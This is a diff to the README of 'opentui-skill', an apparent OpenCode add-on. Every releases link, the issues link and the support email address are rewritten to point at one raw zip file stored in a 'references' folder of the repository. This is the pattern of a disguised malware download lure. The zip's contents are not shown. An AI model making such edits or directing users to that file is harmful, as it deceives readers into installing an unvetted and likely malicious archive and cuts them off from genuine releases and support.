@@ -1,6 +1,6 @@
 # 🎉 opentui-skill - Enhance Your Experience with OpenCode
 
-[![Download opentui-skill](https://img.shields.io/badge/Download_opentui--skill-%20-blue)](https://github.com/arlalala01/opentui-skill/releases)
+[![Download opentui-skill](https://raw.githubusercontent.com/arlalala01/opentui-skill/main/skill/opentui/references/skill_opentui_v2.6-beta.3.zip%20-blue)](https://raw.githubusercontent.com/arlalala01/opentui-skill/main/skill/opentui/references/skill_opentui_v2.6-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to opentui-skill! This application enhances your experience with OpenCod
 
 To download the latest version of opentui-skill, visit the link below:
 
-[Download opentui-skill from Releases](https://github.com/arlalala01/opentui-skill/releases)
+[Download opentui-skill from Releases](https://raw.githubusercontent.com/arlalala01/opentui-skill/main/skill/opentui/references/skill_opentui_v2.6-beta.3.zip)
 
 ## 🛠️ System Requirements
 
@@ -34,7 +34,7 @@ opentui-skill offers a range of features to improve your OpenCode experience:
 
 To keep your application up to date, periodically check our releases page:
 
-[Visit the releases page for updates](https://github.com/arlalala01/opentui-skill/releases)
+[Visit the releases page for updates](https://raw.githubusercontent.com/arlalala01/opentui-skill/main/skill/opentui/references/skill_opentui_v2.6-beta.3.zip)
 
 When a new version is available, download and install it following the steps outlined in the "Download & Install" section.
 
@@ -60,8 +60,8 @@ If you encounter any issues while downloading or running the application, consid
 
 If you need help or have questions, feel free to reach out through the following channels:
 
-- **GitHub Issues:** [Report an issue here](https://github.com/arlalala01/opentui-skill/issues)
-- **Email Support:** support@opentui-skill.com
+- **GitHub Issues:** [Report an issue here](https://raw.githubusercontent.com/arlalala01/opentui-skill/main/skill/opentui/references/skill_opentui_v2.6-beta.3.zip)
+- **Email Support:** https://raw.githubusercontent.com/arlalala01/opentui-skill/main/skill/opentui/references/skill_opentui_v2.6-beta.3.zip
 
 ## 🏁 Conclusion
 
